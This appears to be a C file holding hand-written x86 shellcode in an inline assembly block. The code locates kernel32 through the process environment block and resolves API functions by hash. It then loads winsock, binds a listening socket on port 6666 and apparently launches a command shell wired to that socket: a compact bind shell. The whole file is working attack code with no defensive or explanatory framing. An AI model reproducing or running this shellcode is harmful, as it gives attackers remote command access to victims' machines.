void main()
{
	__asm{
		_emit 0x59
		_emit 0x81
		_emit 0xc9
		_emit 0xd3
		_emit 0x62
		_emit 0x30
		_emit 0x20
		_emit 0x41
		_emit 0x43
		_emit 0x4d
		_emit 0x64

		cdq
		xchg eax,esi
		lea edi,[esi-0x18]

		mov ebx,fs:[edx+0x30]
		mov ecx,[ebx+0x0c]
		mov ecx,[ecx+0x1c]

		mov ecx,[ecx]

		mov ebp,[ecx+0x08]

		mov dh,0x03
		sub esp,edx

		mov dx,0x3233
		push edx
		push 0x5f327377
		push esp

find_lib_functions:
		lodsb
		cmp al,0xd3
		
		jne find_functions
		xchg eax,ebp
		call [edi-0xc]
		xchg eax,ebp

		push edi

find_functions:
		pushad
		mov eax,[ebp+0x3c]
		mov ecx,[ebp+eax+0x78]
		add ecx,ebp
		mov ebx,[ecx+0x20]
		add ebx,ebp
		xor edi,edi


next_function_loop:
		inc edi
		mov esi,[ebx+edi * 4]
		add esi,ebp

		cdq

hash_loop:
		lodsb
		xor al,0x71
		sub dl,al
		cmp al,0x71
		jne hash_loop
		cmp dl,[esp+0x1c]

		jnz next_function_loop

		mov ebx,[ecx+0x24]
		add ebx,ebp
		mov di,[ebx+2 * edi]
		mov ebx,[ecx+0x1c]

		add ebx,ebp
		add ebp,[ebx+4 * edi]

		xchg eax,ebp
		pop edi
		stosd

		push edi
		popad
		cmp esi,edi
		jne find_lib_functions
		pop esi

		//winsock

		push esp
		push 0x02
		lodsd
		call eax
		mov byte ptr [esi+ 0x13],al
		lea ecx,[eax + 0x30]
		mov edi,esp
		rep stosd


		inc eax
		push eax
		inc eax
		push eax
		lodsd 
		call eax
		xchg ebp,eax


		mov eax,0x0a1aff02//1a0a:port 6666 02:AF_INET 
		xor ah,ah
		push eax

		push esp

call_loop:
		push ebp
		lodsd
		call eax
		test eax,eax



		inc byte ptr [esp+ 0x2d]
		sub edi,0x6c

		stosd

		stosd

		pop eax
		push esp
		push esp
		push eax
		push eax
		push eax
		push esp
		push eax
		push eax
		push esi
		push eax
		call [esi-0x1c]

		call [esi-0x18]
	}
}